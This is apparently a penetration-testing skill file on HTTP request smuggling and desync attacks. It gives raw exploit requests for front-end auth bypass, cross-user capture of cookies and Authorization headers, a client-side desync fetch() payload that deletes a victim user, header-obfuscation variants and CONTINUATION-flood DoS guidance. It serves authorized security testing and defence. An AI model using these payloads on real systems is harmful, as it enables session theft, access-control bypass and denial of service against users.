---
name: http-request-smuggling
description: HTTP request smuggling testing covering CL.TE, TE.CL, H2.CL, H2.TE, CL.0/0.CL and client-side desync, pause-based desync, HTTP/2 request tunnelling, and the CONTINUATION flood (DoS), with practical detection, tooling, and exploitation methodology
---

# HTTP Request Smuggling

HTTP request smuggling (HRS) exploits disagreements between a front-end proxy and a back-end server about where one HTTP request ends and the next begins. When the two systems parse `Content-Length` and `Transfer-Encoding` headers differently, an attacker can prefix a hidden request to the back-end's socket, which is then prepended to the next legitimate user's request. The impact ranges from bypassing front-end security controls to full cross-user session hijacking.

## Attack Surface

**Infrastructure Topologies**
- CDN or load balancer in front of origin server (Cloudflare, Nginx, HAProxy, AWS ALB)
- Reverse proxy chains (Nginx → Gunicorn, HAProxy → Node.js, Varnish → Apache)
- API gateways forwarding to microservices
- HTTP/2 front-end to HTTP/1.1 back-end translation (H2.CL / H2.TE)
- Tunneling servers or WAFs that terminate and re-forward requests

**HTTP Versions in Play**
- HTTP/1.1: CL.TE and TE.CL classic smuggling
- HTTP/2: H2.CL (downgrade injects Content-Length) and H2.TE (injects Transfer-Encoding)
- HTTP/3: emerging QUIC-based desync (less common, research-stage)

**Parser Differentials**
- Treatment of duplicate `Content-Length` headers
- Handling of `Transfer-Encoding: chunked` when `Content-Length` is also present
- Chunk size obfuscation via whitespace, tab, case, or invalid extensions

## High-Value Targets

- Front-end security controls (authentication bypass via desync)
- Endpoints shared by many users (high-traffic APIs, chat, feeds)
- Request capture endpoints (search, logging, analytics)
- Session-sensitive endpoints (auth callbacks, account settings)
- Internal admin interfaces proxied through the same connection pool

## Core Concepts

### CL.TE — Front-end uses Content-Length, Back-end uses Transfer-Encoding

Front-end reads `Content-Length: X` bytes and forwards. Back-end reads until the `0\r\n\r\n` chunk terminator. Attacker appends a hidden request after the `0` terminator that the front-end considers part of the same body but the back-end treats as a new request.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
The `G` is left in the back-end's socket buffer and prepended to the next request.

### TE.CL — Front-end uses Transfer-Encoding, Back-end uses Content-Length

Front-end reads chunked body to completion. Back-end reads only `Content-Length` bytes, leaving the remainder on the socket.

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### H2.CL — HTTP/2 Front-end Downgrades to HTTP/1.1, Injects Content-Length

HTTP/2 has no `Content-Length` vs `TE` ambiguity in its own framing. But when the front-end downgrades to HTTP/1.1 for the back-end, an attacker can inject a `content-length` header in the HTTP/2 request that conflicts with the actual body length. Note: `content-length` is a regular HTTP/2 header — pseudo-headers are exclusively `:method`, `:path`, `:authority`, and `:scheme`:
```
:method POST
:path /
:authority target.com
content-type application/x-www-form-urlencoded
content-length: 0

SMUGGLED_PREFIX
```

### H2.TE — HTTP/2 Injects Transfer-Encoding Header

Inject `transfer-encoding: chunked` in HTTP/2 headers (which the HTTP/2 spec forbids, but some front-ends pass through). Back-end receives both headers, may prefer TE over CL.

```
:method POST
:path /
transfer-encoding: chunked

0

SMUGGLED
```

## Client-Side Desync (CL.0 / 0.CL)

Classic CL.TE/TE.CL need a front-end/back-end *pair* that disagree. The CL.0
family needs only one server that mishandles the body, and the client-side
variant is triggerable through a victim's browser with no front-end at all —
which brings single-server sites and intranet hosts into scope.

### CL.0 — Back-end ignores Content-Length

Some endpoints do not expect a request body and ignore `Content-Length`
entirely, so the back-end treats the body as the start of the *next* request
on the connection. Prime candidates: endpoints that trigger a **server-level
redirect** or serve a **static file** (they answer before reading the body).

Detection — send the setup request, then a normal follow-up on the *same*
connection, and watch the follow-up's response (documented CL.0 probe form):
```http
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: xGET / HTTP/1.1
Host: vulnerable-website.com
```
If the follow-up (`GET /`) returns `404`, the back-end parsed the body
(`GET /hopefully404...`) as a standalone request — CL.0 confirmed. The
`Foo: x` line folds the victim's real request line into a header so the
smuggled request stays well-formed. `Content-Length` must cover exactly the
smuggled request line plus the `Foo: x` prefix; tune it to the target and
confirm the socket poisoning with the tooling rather than assuming a length.

**0.CL** is the inverse: the **front-end** ignores/does not forward the body
while the back-end honours `Content-Length` and waits for bytes that arrive
from the next request. Probe it as a timing differential (back-end blocks for
the missing bytes) the way TE.CL is probed.

### Client-Side Desync (CSD)

Built on CL.0 but using **fully browser-compatible HTTP/1.1** — no chunked
tricks, no illegal headers — so a page you control can make the *victim's own
browser* poison its connection to a single-server target. Attacker JS issues a
credentialed cross-origin `fetch` whose body is the smuggled prefix; the
browser reuses the keep-alive connection for the victim's next same-origin
navigation, which is then prefixed by the smuggled request:
```javascript
// hosted on attacker origin; runs in the victim's browser
fetch('https://target/vulnerable-endpoint', {
  method: 'POST', mode: 'no-cors', credentials: 'include',
  // body is a full smuggled request the back-end will treat as request #2
  body: 'GET /admin/deleteUser?user=victim HTTP/1.1\r\nFoo: x'
}).then(()=>{ location = 'https://target/'; });  // reuse the poisoned connection
```
Because the request is browser-legal, this reaches targets that are immune to
proxy-based smuggling: single servers, and internal hosts reachable only from
the victim. Impact classes: victim-driven state change, stored/redirected XSS
into the victim's response, and capturing the victim's next request. Confirm
against a lab first; the exact body and endpoint are target-specific.

## Pause-Based Desync & HTTP/2 Request Tunnelling

### HTTP/2 Request Tunnelling

When the front-end reuses one HTTP/1.1 back-end connection per HTTP/2 stream
(not a shared pool), you cannot poison a *later* user — but you can **tunnel** a
second request inside your own stream and read its response yourself. Inject a
CRLF-bearing value (in a header, or `:path`/`:authority` when the front-end
copies it unescaped into the HTTP/1.1 request line) so the downgraded request
carries an embedded second request; the back-end's response to the tunnelled
request is returned within your stream. This turns H2.CL/H2.TE into a
no-victim, self-contained read primitive — useful to reach internal-only paths
(`/admin`, metadata) and to leak the front-end's internal request rewriting.
The exact injection point (header value vs pseudo-header) and whether the
front-end preserves the CRLF are target-specific — enumerate with the tooling.

### Pause-Based Desync

Some back-ends split a request when the byte stream pauses mid-message: send
the headers (or a partial chunked body), pause past the server's read timeout,
and the server processes what it has and treats the delayed remainder as a new
request. This desyncs servers that show no CL/TE disagreement at all — the
oracle is *timing of the split*, not header parsing. Reproduce it with a client
that controls exactly when bytes are released (Turbo Intruder), not a normal
HTTP client that flushes the whole request at once. Connection-state and
first-request-routing attacks (where the front-end routes a whole connection
based only on its first request's Host) fall in the same family: smuggle a
first request to a permitted vhost, then reuse the connection for a restricted
one.

### HTTP/2 CONTINUATION Flood (DoS)

Separate from smuggling but the same frame layer: a stream of `CONTINUATION`
frames **without the `END_HEADERS` flag** forces the server to buffer and
HPACK-decode unbounded header data → out-of-memory or CPU exhaustion, often
pre-authentication and without appearing in access logs. Disclosed across
implementations in April 2024 (CERT/CC VU#421644): **CVE-2024-27983**
(Node.js), **CVE-2024-28182** (nghttp2), **CVE-2024-27919** and
**CVE-2024-30255** (Envoy), **CVE-2024-31309** (Apache Traffic Server), and
**CVE-2024-2653** (amphp/http). Fingerprint the HTTP/2 server and version and
match it to the relevant advisory before testing; this is a resource-exhaustion
test — run it only within an explicit DoS-authorized scope and with strict
ceilings.

## Key Vulnerabilities

### Front-End Security Control Bypass

A front-end proxy enforces authentication or IP restriction by checking request headers and blocking or allowing based on rules. If a smuggled prefix bypasses the front-end (because it's buried in a prior request's body from the front-end's view), the back-end processes it without the security check.

**PoC structure (CL.TE):**
```http
POST /not-restricted HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-Host: target.com
Content-Length: 10

x=1
```
The `GET /admin` is seen by the back-end as a new, legitimate request originating from the trusted proxy IP.

### Cross-User Request Capture

Poison the back-end socket with a partial request prefix that captures the next victim user's request (including their cookies, tokens, request body) into the response of a controlled endpoint (search, comment submission).

**PoC structure (CL.TE capture):**
```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 120
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

q=
```
`Content-Length: 100` in the smuggled prefix is longer than the actual smuggled body, so the back-end waits for 100 bytes — which it sources from the *next* user's request. The `/search` endpoint reflects the query, capturing headers and body of the subsequent request.

### Response Queue Poisoning

On pipelined connections, cause a misaligned response to be delivered to the wrong user (HTTP/1.1 response queue poisoning). Used to deliver attacker-controlled content or steal another user's response.

### Request Reflection / Cache Poisoning Chain

Smuggle a prefix that hits a cacheable endpoint with an injected `Host` header. If the cache stores the response keyed only on URL, the poisoned response is served to all users requesting that URL.

### WebSocket Handshake Hijacking

If the proxy performs WebSocket upgrade, a smuggled `Upgrade` request can hijack an existing WebSocket connection from a subsequent user.

## Detection Techniques

### Timing-Based Detection

**CL.TE:** Send a request where `Content-Length` is complete but `Transfer-Encoding` body is missing the `0\r\n\r\n` terminator. A CL.TE-vulnerable back-end waits for the terminator, causing a timeout.

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

3
abc
X
```
If response is delayed 10–30 seconds, CL.TE desync likely.

**TE.CL:** Send a request with a complete chunked body (including the `0\r\n\r\n` terminator so the front-end is satisfied) but with `Content-Length` set to **more** bytes than the body actually provides. The back-end, using Content-Length, waits for the remaining bytes that never arrive — producing a 10–30 second timeout. Setting Content-Length *less* than the body causes socket poisoning (differential-response detection), not a timeout.

### Differential Response Detection

Send two requests in sequence. If the second request receives an unexpected response (error, redirect, wrong content), the first may have poisoned the socket. Use a unique string in the smuggled prefix to confirm.

### Content-Length + Transfer-Encoding Combination

```http
Transfer-Encoding: xchunked        # non-standard value, some FE ignore, BE accept
Transfer-Encoding: chunked         # leading space before value (0x20 byte after colon+space)
Transfer-Encoding:	chunked        # tab character before value
Transfer-Encoding: x
Transfer-Encoding: chunked         # duplicate TE headers, BE uses last
```

## Transfer-Encoding Obfuscation

To force TE disagreement:
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked       # space before colon
X: X<CRLF>Transfer-Encoding: chunked # header injection — inject actual CRLF bytes at <CRLF>, not the literal string \r\n
Transfer-Encoding: chunked<CRLF>Transfer-Encoding: x  # TE twice — inject actual CRLF bytes at <CRLF>
```

## HTTP/2-Specific Detection

- Send HTTP/2 requests with an injected `content-length` regular header that differs from the actual body length
- Inject `transfer-encoding: chunked` in HTTP/2 headers (spec-forbidden but sometimes passed through)
- Use HTTP/2 header injection: inject newlines in header values if the front-end passes them to HTTP/1.1 back-end unescaped
- Observe whether the HTTP/2 connection ID corresponds to a persistent HTTP/1.1 connection to the back-end (connection reuse amplifies impact)

## Testing Methodology

1. **Map the proxy chain** — identify front-end (CDN, load balancer, WAF) and back-end (app server)
2. **Probe CL.TE** — send a timing probe with mismatched chunked terminator; observe delay
3. **Probe TE.CL** — send a timing probe with complete chunked body but Content-Length larger than the actual body; observe back-end timeout
4. **Obfuscate TE header** — try each obfuscation variant (tab, extra space, duplicate, non-standard value)
5. **Confirm with differential response** — send two rapid identical requests; if second gets an unexpected response, socket is poisoned
6. **Attempt bypass exploit** — craft a smuggled `GET /admin` or restricted endpoint and observe if back-end accepts it
7. **Attempt capture** — poison with a partial POST pointing to a reflective endpoint; wait for a follow-up request to fill the buffer
8. **Test H2.CL/H2.TE** — repeat the same probes over HTTP/2 connections if the target supports HTTP/2

## Validation

1. Show a timing differential of 10+ seconds on the CL.TE or TE.CL probe and explain the mechanism
2. Demonstrate a bypass: smuggle a request to `/admin` and receive a 200 response where a direct request returns 403
3. For capture: show a subsequent user's `Cookie` or `Authorization` header appearing in the response of a controlled endpoint
4. Confirm with a unique marker string in the smuggled prefix to rule out timing noise
5. Provide the exact raw bytes of the smuggled request

## False Positives

- General network latency or server-side processing delays unrelated to smuggling
- Server consistently close connection after first request (no connection reuse, no socket sharing)
- HTTP/2 with full end-to-end HTTP/2 to back-end (no HTTP/1.1 downgrade, no desync surface)
- WAF or proxy that normalizes TE/CL headers before forwarding (removes the ambiguity)

## Impact

- Authentication and authorization bypass by smuggling requests past front-end access controls
- Cross-user session hijacking by capturing requests containing session tokens
- Cache poisoning affecting all users of a cached resource
- Internal service access bypassing IP-based restrictions enforced at the front-end
- XSS delivery via response queue poisoning in shared connection contexts

## Pro Tips

1. Use Burp Suite's HTTP Request Smuggler extension as a rapid scanner, but always confirm manually — false positives are common
2. TE obfuscation is the most reliable path; `Transfer-Encoding: xchunked` works on many Apache/IIS back-ends
3. Keep smuggled prefixes short during detection; use the minimal body to confirm desync before attempting capture attacks
4. H2.CL is the most impactful modern variant — many CDNs translate HTTP/2 to HTTP/1.1 and derive `Content-Length` from the `content-length` regular header sent in the HTTP/2 request (not a pseudo-header — inject it as a normal header field)
5. In capture attacks, set `Content-Length` in the smuggled prefix larger than your partial body by 50–100 bytes to catch a full auth header from the next user
6. Test during low-traffic periods first to avoid affecting real users; always get explicit authorization for capture attempts
7. If timing probes are inconsistent, pipeline two requests over the same connection and look for unexpected response swapping

## Tooling

Smuggling needs a client that sends *exact bytes* and controls connection reuse
and byte timing — normal HTTP libraries normalize the request and defeat the
test.

- **HTTP Request Smuggler** (Burp extension, James Kettle) — the primary
  scanner. Its "Smuggle probe" covers CL.TE/TE.CL and the HTTP/2 variants; the
  **connection-state probe** detects CL.0 / 0.CL / first-request-routing; it
  also generates browser-powered-desync PoCs. Always confirm a hit manually —
  false positives are common on load-balanced pools.
- **Turbo Intruder** (Burp) — for the primitives the scanner can't: the
  **single-packet attack** (send a full request in one TCP packet to remove
  network jitter), holding a connection open and **releasing bytes on a timer**
  for pause-based desync, and scripting the setup+follow-up pair on one
  connection for CL.0 confirmation. Use its `Connection: keep-alive` +
  `pipeline` control rather than a fresh connection per request.
- **Raw sender** — for a minimal manual PoC (and to satisfy "provide the exact
  raw bytes"), send with `openssl s_client -connect host:443 -quiet` (TLS) or
  `ncat host 80`, pasting CRLF-exact bytes; scripts must write real `\r\n`, not
  the literal characters. `h2csmuggler` covers the HTTP/2-cleartext-upgrade
  smuggling variant where an edge proxies `Upgrade: h2c`.
- Pair with `interactsh-client` (sandbox) for an OOB oracle when a smuggled
  request should trigger an outbound callback.

## Summary

HTTP request smuggling is eliminated by enforcing consistent TE/CL interpretation at every hop in the proxy chain, preferring end-to-end HTTP/2, and having back-end servers reject or normalize ambiguous requests. At the proxy level, never forward TE headers that were not present in the original request, and treat conflicting CL + TE as a hard error.
